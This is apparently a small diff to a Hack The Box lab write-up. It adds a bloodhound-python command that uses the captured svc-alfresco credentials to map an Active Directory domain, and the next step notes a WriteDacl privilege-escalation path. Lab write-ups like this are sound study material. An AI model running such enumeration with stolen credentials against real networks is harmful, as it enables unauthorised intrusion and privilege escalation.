@@ -43,7 +43,7 @@
 
 4. With svc-alfresco's credentials, run Bloodhound
 
-``
+`sudo bloodhound-python -d htb.local -u svc-alfresco -p $(cat ../svc-alfresco.password) -ns 10.129.95.210 -c all`
 
 5. Bloodhound shows svc-alfresco user has WriteDacl permissions on the domain.
 
